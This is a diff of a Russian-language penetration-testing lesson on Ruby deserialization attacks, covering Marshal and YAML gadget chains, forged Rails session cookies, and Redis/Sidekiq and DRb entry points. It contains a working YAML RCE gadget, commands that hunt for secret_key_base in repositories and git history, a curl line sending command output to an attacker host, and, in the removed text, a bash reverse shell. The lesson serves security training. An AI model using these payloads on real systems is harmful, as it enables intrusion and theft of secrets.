@@ -14,42 +14,104 @@ useful_for:
 estimated_minutes: 36
 summary: "Ruby-десериализация: Marshal.load и YAML.load gadget'ы, Rails-цепочки, universal deserialisation gadget."
 ---
-Ruby сериализует объекты через `Marshal` (бинарь) и `YAML` (текст). `Marshal.load` и `YAML.load` (без `safe_load`) восстанавливают **произвольные объекты** и вызывают их методы (`_load`, `init_with`, `hash`, `to_s`), что даёт RCE. В Rails-приложениях есть готовые gadget-цепочки («universal deserialization gadget» для Rails 5/6), а подписанные cookie с `Marshal` — классическая точка. Этот урок — про генерацию payload, обход подписи и реальные точки входа.
 
-Ruby-десериализация интересна тем, что «магия» живёт не в формате, а в наборе классов, уже загруженных приложением: Rails, ActiveSupport, RubyGems, Net::*. Именно поэтому одна и та же payload работает или не работает в зависимости от точной версии фреймворка.
+## Вопрос, с которого всё начинается
 
-## Теория: где ломается
+Мы прошли Python и Node. В Ruby механизм десериализации устроен хитрее: «магия» живёт не в формате, а в **наборе классов, уже загруженных приложением**. У типичного Rails-приложения в памяти тысячи классов фреймворка, и среди них есть такие, чьи методы при определённой последовательности вызовов приводят к запуску команды.
 
-- **`Marshal.load(input)`** — восстанавливает любой класс; через цепочку `_load`/`init_with`/`hash` → RCE.
-- **`YAML.load(input)`** — до Psych 4 (Ruby 3.1) unsafe by default; тег `!ruby/object:...` создаёт объекты, `!ruby/object:Gem::...` строит цепочки.
-- **Rails cookies** — `Marshal` + подпись (`secret_key_base`). Если ключ утёк/слаб — подделываем сессию с gadget.
-- **`ActiveSupport::MessageVerifier`/`MessageEncryptor`** — те же риски при утечке ключа.
-- **`ActiveRecord` сериализованные колонки** — `serialize :field` использует YAML/Marshal.
+Вопрос: можно ли собрать из этих классов «дорожку» до выполнения кода и подсунуть её серверу как обычную сессионную cookie? Да — и это классический путь к RCE в Rails. Разберём на одном примере.
 
-Ключевое отличие от Python: RCE не в «магии формата», а в **gadget-цепочке из классов, уже загруженных приложением** (Rails, RubyGems, ActiveSupport).
+## Наш пример
 
-## Байтовая структура Marshal
-
-`Marshal.dump` выдаёт бинарь, начинающийся с `\x04\x08` (major/minor версии). Признак в cookie/параметре после base64: `BAhv` / `BAh7`. Быстрая проверка:
+Есть Rails-приложение `portal.example`. При входе оно ставит cookie сессии:
 
 ```bash
-echo 'BASE64' | base64 -d | xxd | head
-# 0408  — это Marshal
-ruby -e 'p Marshal.load(File.binread("payload"))'
+$ curl -si https://portal.example/login -d 'user=bob&pass=...' | grep -i set-cookie
+Set-Cookie: _session_id=BAh7CEkiD3Nlc3Npb25faWQGOgZFVE...
 ```
 
-YAML-признаки: `--- !ruby/object:` / `--- !ruby/hash:` в декодированном тексте. Полезно сразу отличить: `\x04\x08` — бинарь, `---` — текст.
+Значение `_session_id` — base64. Декодируем:
 
-## YAML-инъекция (простые payload)
+```bash
+$ echo 'BAh7CEkiD3Nlc3Npb25faWQGOgZFVE...' | base64 -d | xxd | head -1
+00000000: 0408 7b08 4909 2273 6573 7369 6f6e 5f69  ..{.I."session_i
+```
 
-Простейший вариант через `ERB` (срабатывает, если есть gadget, вызывающий `result`/`src`):
+Первые два байта `04 08` — сигнатура **Marshal**, встроенного формата сериализации Ruby (`base64` от них начинается с `BAh`). Значит, Rails хранит сессию как `Marshal`-объект. Ключевой вопрос: **проверяет ли сервер, что объект не подделали?** В Rails — да, cookie **подписана** ключом `secret_key_base`. Поэтому путь к RCE — сначала найти этот ключ.
+
+## Шаг 1: что такое gadget-цепочка
+
+В Python мы просто заставляли `pickle` вызвать `os.system`. В Ruby так нельзя: `Marshal.load` восстанавливает объекты и вызывает их методы `_load`, `init_with`, `hash`, `to_s` — и среди классов Rails/RubyGems находятся такие, чей метод, вызванный в нужный момент, запускает команду.
+
+«Дорожка» из таких классов и есть **gadget-цепочка** («universal deserialization gadget» для Rails 5/6). Она зависит от точной версии фреймворка: классы и их методы меняются между версиями, поэтому один и тот же payload работает или не работает в зависимости от Rails/Ruby. Готовые скрипты (`rails_universal_gadget`, `Ruby-Marshal-RCE`) собирают эту цепочку за тебя:
+
+```bash
+$ ruby gadget.rb "id" > payload.bin
+$ base64 -w0 payload.bin
+```
+
+## Шаг 2: ищем `secret_key_base`
+
+Без ключа подпись cookie не сойдётся, и Rails отбросит запрос. Ключ утекает по-разному — ищем:
+
+```bash
+$ grep -rn "secret_key_base" . --include='*.yml' --include='*.rb' --include='.env*'
+$ git log -p | grep -i secret_key_base
+$ cat config/master.key        # ключ расшифровки credentials
+```
+
+Кроме репозитория, ключ бывает в `.env`, в git-истории (если коммитили и «удалили»), в Docker-слоях, а иногда оставлен дефолтным. Нашли ключ — почти всё готово.
+
+## Шаг 3: подделываем cookie и подтверждаем RCE
+
+Скрипт умеет подписать наш gadget тем же ключом:
+
+```bash
+$ ruby gadget.rb "curl http://ATTACKER:8080/$(id|base64)" --secret "$SECRET_KEY_BASE" > cookie
+$ python3 -m http.server 8080 &
+$ curl -s https://portal.example/ -H "Cookie: _session_id=$(base64 -w0 cookie)"
+# в логе: GET /dWlkPTAocm9vdCkK
+```
+
+Пришёл запрос с base64 от `id=0(root)` — код выполнен. Доказательство через **OOB** надёжнее, чем ждать вывод в ответе: деструкторы Ruby не возвращают текст.
+
+Если cookie **зашифрован** (не просто подписан — `MessageEncryptor`), нужен тот же `secret_key_base` для ключа шифрования; скрипт умеет и это. А если ключ так и не нашёлся — вектор временно **заблокирован**: без него подпись не сойдётся. Тогда ищем другую точку, где Marshal десериализуется **без проверки подписи** (см. шаг 4).
+
+## Шаг 4: где ещё десериализуется Ruby
+
+- **Redis/Sidekiq/Resque:** если настроен `Marshal`-сериализатор, задачи лежат в Redis как Marshal-блобы. Redis без пароля → пишем свой:
+
+```bash
+$ redis-cli -h TARGET RPUSH queue:default '<marshal payload>'
+```
+
+Воркер десериализует → RCE. Тот же паттерн «доступ к Redis → очередь → RCE».
+
+- **DRb (Distributed Ruby):** использует Marshal по сети и часто не аутентифицирован вовсе:
+
+```bash
+$ ruby -e 'require "drb"; p DRbObject.new_with_uri("druby://TARGET:8787")'
+```
+
+- **YAML-точки:** если параметр уходит в `YAML.load`, работает текстовая инъекция (шаг 5).
+- **`ActiveRecord serialize :field`:** сериализованные колонки используют YAML/Marshal.
+
+Ищи опасные загрузчики статически:
+
+```bash
+$ grep -rn "Marshal.load\|YAML.load\|Psych.load" . --include='*.rb'
+```
+
+## Шаг 5: YAML-инъекция
+
+Ruby-специфичные YAML-теги создают объекты прямо из текста. Простейший вариант — через `ERB`:
 
 ```yaml
 --- !ruby/object:ERB
 src: "<%= system('id') %>"
 ```
 
-Тег `!ruby/object:ClassName` создаёт объект класса; если какой-то метод цепочки приведёт его к строке/вызовет `result`, произойдёт исполнение. Более практичный — **universal gadget** (зависит от версии Rails/Ruby):
+Тег `!ruby/object:ClassName` создаёт объект класса; если цепочка приведёт его к строке или вызовет `result`, произойдёт выполнение. Практичнее — universal gadget через `Gem::Requirement`, где якоря `&1` строят циклический граф:
 
 ```yaml
 --- !ruby/object:Gem::Requirement
@@ -68,246 +130,95 @@ requirements:
        method_id: :resolve
 ```
 
-Этот YAML запускает `Kernel#system('id')` через `Gem::RequestSet#resolve` → `Net::WriteAdapter#write` → `system`. Якоря `&1` и ссылки важны: они строят циклический граф, который и запускает цепочку.
-
-## Marshal-инъекция
-
-Бинарный payload генерируют скриптом под конкретную версию Rails/Ruby. Общая схема:
-
-```ruby
-# пример генерации universal gadget (Rails 5.x/6.x)
-require 'erb'
-# строим цепочку объектов, где финальный вызов -> Kernel#system
-# затем Marshal.dump(obj) -> бинарь
-```
-
-Готовые публичные скрипты: `rails_universal_gadget`, `Ruby-Marshal-RCE`, `universal-deserialization-gadget`. Вывод обычно отдают в base64 или hex:
+Доставка — в теле запроса с `Content-Type: application/x-yaml`:
 
 ```bash
-ruby gadget.rb "id" > payload.bin
-base64 -w0 payload.bin
+$ curl -s https://portal.example/api/import \
+  -H 'Content-Type: application/x-yaml' --data-binary @evil.yml
 ```
 
-## Разобранный пример: Rails session cookie
+Признак успеха — обратный DNS/HTTP-запрос к твоему listener'у или файл-маркер.
 
-Шаг 1 — находим `secret_key_base` (утечки: `.env`, git-история, `config/master.key`, дефолт в конфиге, Docker-образ).
-
-```bash
-grep -r "secret_key_base" . --include='*.yml' --include='*.rb' --include='.env*'
-git log -p | grep -i secret_key_base
-```
-
-Шаг 2 — генерируем malicious cookie с gadget:
-
-```bash
-ruby gadget.rb "id" --secret "$SECRET_KEY_BASE" > cookie
-```
-
-Шаг 3 — подставляем cookie:
-
-```bash
-curl -s "https://app.example/" -H "Cookie: _session_id=<cookie>"
-```
-
-Шаг 4 — RCE (OOB/reverse shell). Если cookie зашифрован (`MessageEncryptor`, `encrypted_cookie_salt`), нужен ещё и `secret_key_base` для ключа шифрования — тот же скрипт умеет и это. Доказательство без интерактива:
-
-```bash
-ruby gadget.rb "id > /tmp/proof" --secret "$SECRET_KEY_BASE" > cookie
-# затем читаем результат через любой файловый LFI/SSRF или reverse shell
-```
-
-## Где искать точки
-
-- Cookies (`Marshal`-сериализация сессий; base64 начинается с `BAh`).
-- `Marshal.load`/`YAML.load` в коде: кеш, RPC, Redis, Sidekiq (сериализует аргументы).
-- Rails `MessageVerifier`/`MessageEncryptor` с утёкшим ключом.
-- RPC/DRb (Distributed Ruby), Resque.
-- Redis-кеш с Marshal; `ActiveRecord serialize`.
-- Признаки в ошибке: `Marshal`, `Psych`, `undefined class/module`, `_load`.
-
-Поиск по исходникам:
-
-```bash
-grep -rn "Marshal.load\|YAML.load\|Psych.load\|unserialize" . --include='*.rb'
-grep -rn "secret_key_base\|master.key" . --include='*.rb' --include='*.yml'
-```
-
-## Разобранный пример: Sidekiq/Resque (очереди)
-
-Sidekiq по умолчанию сериализует аргументы задач в JSON, но с плагином `Sidekiq::Client` / кастомным `Marshal`-сериализатором кладёт в Redis Marshal-блобы. Если Redis доступен без auth:
-
-```bash
-redis-cli -h TARGET RPUSH queue:default '<marshal payload>'
-```
-
-Воркер десериализует → RCE. Это тот же паттерн «SSRF/доступ к Redis → очередь → RCE».
-
-## Разобранный пример: DRb (Distributed Ruby)
-
-DRb использует `Marshal` по сети. Если порт DRb открыт:
-
-```bash
-# проверяем, отвечает ли DRb
-ruby -e 'require "drb"; p DRbObject.new_with_uri("druby://TARGET:8787")'
-# доставляем Marshal-payload (по сути тот же gadget, что для cookie)
-```
-
-DRb-интерфейсы часто не аутентифицированы вовсе, что делает их приоритетной целью.
-
-## Инструменты
-
-- **`rails_universal_gadget`** и публичные скрипты (`Ruby-Marshal-RCE`).
-- **`ruby`** — локальная генерация/проверка (`ruby -e 'p Marshal.load(...)'`).
-- **Burp Repeater** — доставка cookie.
-- **`ysoserial`** — для Java (смежная тема), для Ruby — свои скрипты.
-- **`git`/`grep`** — поиск утёкшего `secret_key_base`.
-- **`brakeman`** — статический анализ Rails на `Marshal.load`/`YAML.load`.
-
-```bash
-# статический поиск опасных загрузчиков в Rails-проекте
-brakeman -q --no-pager | grep -iE 'marshal|yaml|deserial'
-```
-
-## Marshal vs YAML: что выбрать
+## Шаг 6: Marshal против YAML — что выбрать
 
 | Критерий | Marshal | YAML |
 |----------|---------|------|
-| Формат | бинарь (`\x04\x08`) | текст |
+| Формат | бинарь (`04 08`) | текст |
 | Признак | base64 `BAh` | `--- !ruby/object:` |
 | Где встречается | cookies, Redis, Sidekiq | конфиги, API, `serialize`-колонки |
 | Unsafe по умолчанию | всегда | до Ruby 3.1 (Psych 4) |
 | Доставка | base64/hex | как есть / в теле |
 
-Начинайте с того формата, который реально видите в перехвате; не подменяйте один другим.
+Важная деталь: начиная с Ruby 3.1 (Psych 4) `YAML.load` стал **безопасным** по умолчанию. Поэтому YAML-инъекция работает только на старых версиях или там, где явно вызван `unsafe_load`. Начинай с того формата, который реально видишь в перехвате.
 
-## Защита и её обход
+## Что мы теперь знаем
 
-Безопасный путь: `Marshal.load` не применять к недоверенным данным; для YAML — `YAML.safe_load` (Psych 4+ делает это по умолчанию); не хранить `secret_key_base` в репозитории. Обходы слабых защит: подмена загрузчика, использование `Psych.unsafe_load`, эксплуатация утёкшего ключа для подписи. Ещё вариант — если приложение сравнивает класс до `load`, можно подсунуть подкласс, проходящий проверку.
+- `Marshal.load` и `YAML.load` (без safe) восстанавливают произвольные объекты Ruby.
+- RCE строится из **gadget-цепочки** классов, уже загруженных приложением; она зависит от версии Rails/Ruby.
+- Rails-сессия — это Marshal + подпись `secret_key_base`; без ключа cookie не пройдёт.
+- Инструменты: `rails_universal_gadget`, `Ruby-Marshal-RCE`; для поиска ключа — grep/git.
+- Признаки: base64 `BAh`/`BAhv` (Marshal), `--- !ruby/object:` (YAML).
+- Артефакт — OOB-запрос или файл-маркер, а не «ошибка 500».
 
-## Частые ошибки
+## На что смотреть дальше
 
-- **Забыть про подпись cookie.** Нужен `secret_key_base`, иначе Rails отбросит cookie.
-- **Использовать gadget не под ту версию Rails/Ruby.** Набор доступных классов меняется.
-- **Путать YAML и Marshal.** Разные форматы, разная доставка.
-- **Игнорировать Ruby 3.1+.** `YAML.load` стал safe по умолчанию (Psych 4).
-- **Ждать stdout в ответе.** Деструкторы не возвращают вывод — OOB.
-- **Сдаваться на «не тот формат».** Пробуйте base64/hex/url-encoding.
-- **Ломать прод.** RCE — только с согласия.
-
-## Что дальше / решение
-
-1. Cookie начинается с `BAh`/`BAhv` после base64 → это Marshal, ищите ключ и версию Rails.
-2. Параметр уходит в `YAML.load` → пробуйте `--- !ruby/object:ERB`/universal gadget.
-3. Есть `secret_key_base` → подделывайте подписанную cookie с gadget.
-4. Нет ключа → ищите SSRF/другую утечку; сам по себе gadget не пройдёт проверку подписи.
-5. RCE подтверждён → ставьте **устойчивый** канал (reverse shell/tunnel) и **читайте результат обратно** как доказательство.
-6. Тупик → переходите к `web-python-deser`/`web-php-deser-chains` или к очереди Redis.
-
-## Справочная таблица
-
-| Признак | Формат | Что делать |
-|---------|--------|------------|
-| base64 `BAh`/`BAhv` | Marshal | искать ключ/версию |
-| `\x04\x08` в hex | Marshal | разобрать `ruby -e` |
-| `--- !ruby/object:` | YAML | universal gadget |
-| `--- !ruby/hash:` | YAML | hash-объект |
-| `Psych::` в ошибке | YAML | unsafe_load |
-| `undefined class/module` | нет класса | сменить gadget |
-| `_session_id` cookie | Rails | нужен secret |
-## Практический чек-лист по шагам
-
-1. **Детект формата.** Cookie/параметр после base64 начинается с `BAh` → Marshal; в теле видно `--- !ruby/object:` → YAML.
-2. **Определение стека.** Rails (`_session_id`, `_rails`), версия Rails/Ruby (баннеры, `Gemfile.lock` при утечке, поведение cookie).
-3. **Поиск ключа.** `secret_key_base`, `config/master.key`, `.env`, git-история, Docker-слои, дефолты фреймворка.
-4. **Выбор гаджета.** Universal gadget под версию Rails; для YAML — `Gem::Requirement`-цепочка; для простых случаев — `ERB` с `src`.
-5. **Генерация.** Публичный скрипт `rails_universal_gadget`/`Ruby-Marshal-RCE`, вывод в base64.
-6. **Доставка.** Cookie в том же виде (подпись/шифрование тем же ключом).
-7. **Эксфильтрация.** OOB/reverse shell; read-back доказательство.
-8. **Закрепление.** Устойчивый канал + фиксация версии гаджета.
-
-## Разобранный пример 5: полный walkthrough CTF-кейса
-
-Дано: Rails-приложение, в ответе — cookie `_session_id=<base64>`, начинающийся с `BAh`. Рядом лежит `/admin` с 403.
-
-```bash
-# 1. подтверждаем Marshal
-echo "$COOKIE" | base64 -d | xxd | head -1
-# 00000000: 0408  ...            -> Marshal
-
-# 2. ищем secret_key_base в утечке исходников
-curl -s https://app.example/.env 2>/dev/null | grep -i secret
-# SECRET_KEY_BASE=0f9a... (или берём из git-истории / config/master.key)
-
-# 3. генерируем гаджет под версию Rails
-ruby rails_universal_gadget.rb "id" "$SECRET_KEY_BASE" > cookie.bin
-
-# 4. доставляем
-curl -s -b "_session_id=$(base64 -w0 cookie.bin)" https://app.example/admin
-
-# 5. результат часто OOB -> reverse shell
-ruby rails_universal_gadget.rb \
-  "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'" \
-  "$SECRET_KEY_BASE" > cookie.bin
-```
-
-Если ключ не найден — вектор `blocked`: без `secret_key_base` подпись не сойдётся. В этом случае ищем другую точку (Redis/Sidekiq/DRb), где Marshal десериализуется без проверки подписи.
-
-## Разобранный пример 6: YAML-инъекция в API
-
-Если API принимает YAML (`Content-Type: application/x-yaml`) и вызывает `YAML.load`:
-
-```bash
-curl -s https://app.example/api/import \
-  -H 'Content-Type: application/x-yaml' \
-  --data-binary $'--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module \'Kernel\'\n               method_id: :system\n           git_set: id\n       method_id: :resolve\n'
-```
-
-Признак успеха — обратный DNS/HTTP-запрос к нашему листенеру или файл-маркер. Если приложение отвечает 200 и «игнорирует» объект — значит YAML распарсен, но гаджет не сработал под эту версию; подбирайте цепочку под точную версию RubyGems.
+- **Не забудь про подпись.** Без `secret_key_base` поддельная cookie отбрасывается — это `blocked`, а не «не уязвимо».
+- **Gadget под версию.** Набор классов меняется; подбирай цепочку под точную версию Rails/Ruby.
+- **YAML стал безопасным в Ruby 3.1.** Проверяй версию перед выводом.
+- **Ищи точки без подписи:** Redis/Sidekiq, DRb, кеш — там Marshal десериализуется «как есть».
+- **Не путай форматы.** Marshal и YAML — разная доставка; не подменяй один другим.
+- **Только с согласия.** RCE меняет состояние прода.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой метод Ruby опасен при недоверенном вводе?"
+- question: "Декодированная cookie начинается с байтов `04 08`. Что это?"
   options:
-    - "JSON.parse"
-    - "Marshal.load"
-    - "String#split"
-    - "Array#map"
+    - "Python pickle"
+    - "Ruby Marshal"
+    - "PHP serialize"
+    - "ZIP-архив"
   answer: 1
-  explanation: "Marshal восстанавливает произвольные объекты."
-- question: "Что нужно для подделки Rails session cookie?"
+  explanation: "`04 08` — сигнатура Marshal; в base64 это `BAh`."
+- question: "Что обязательно нужно для подделки Rails session cookie?"
   options:
     - "Только cookie"
-    - "secret_key_base и gadget под версию"
-    - "TLS"
-    - "SQL"
+    - "`secret_key_base` и gadget под версию Rails"
+    - "TLS-сертификат"
+    - "SQL-инъекция"
   answer: 1
-  explanation: "Подпись проверяется ключом."
+  explanation: "Rails проверяет подпись ключом, поэтому нужен ключ и подходящая цепочка."
 - question: "Какой YAML-тег создаёт Ruby-объект?"
   options:
-    - "!!str"
-    - "!ruby/object:ClassName"
-    - "!!int"
-    - "!!map"
+    - "`!!str`"
+    - "`!ruby/object:ClassName`"
+    - "`!!int`"
+    - "`!!map`"
   answer: 1
-  explanation: "Ruby-специфичный тег."
+  explanation: "Ruby-специфичный тег создаёт объект указанного класса."
 - question: "Почему universal gadget зависит от версии?"
   options:
     - "Он длинный"
-    - "Классы цепочки меняются между версиями Rails/Ruby"
-    - "Он шифрует"
-    - "Он кеширует"
+    - "Набор доступных классов и их методы меняются между версиями Rails/Ruby"
+    - "Он шифруется"
+    - "Он кешируется"
   answer: 1
-  explanation: "Набор доступных классов различается."
-- question: "Какая версия Ruby сделала YAML.load безопасным по умолчанию?"
+  explanation: "Цепочка строится из классов, которые есть в конкретной версии."
+- question: "Ключ `secret_key_base` не найден. Как это трактовать?"
   options:
-    - "2.7"
-    - "3.1"
-    - "2.4"
-    - "1.9"
+    - "Цель безопасна"
+    - "Вектор через cookie заблокирован; ищи точку десериализации без подписи (Redis/DRb)"
+    - "Надо сменить браузер"
+    - "Это XSS"
   answer: 1
-  explanation: "Psych 4 / Ruby 3.1."
+  explanation: "Без ключа подпись не сойдётся, но есть другие точки без проверки подписи."
 ```
+
+## Куда дальше
+
+Дальше мы разберём самую популярную «фабрику» готовых цепочек для PHP — **`phpggc`** и устройство POP-цепочек (`web-php-deser-chains`). А пока главное запомни: в Ruby RCE строится из **классов, уже загруженных приложением**, а входной точкой часто служит подписанная cookie.
 
 ## Где пригодится
 
